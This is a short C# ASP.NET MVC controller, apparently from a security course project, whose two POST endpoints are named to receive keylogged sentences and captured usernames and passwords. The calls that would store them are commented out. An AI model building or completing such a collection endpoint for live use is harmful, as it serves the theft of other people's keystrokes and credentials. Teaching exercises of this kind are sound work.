using M183.BusinessLogic;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace M183.UI.Controllers
{
    public class APIController : Controller
    {
        private static Repository repository = new Repository();

        [HttpPost]
        public void CollectKeyLogging(string sentence)
        {
            //repository.SaveKeyLog(sentence);
        }

        [HttpPost]
        public void CollectUsernamePassword(string username, string password)
        {
            //repository.SaveAccountLog(username, password);
        }
    }
}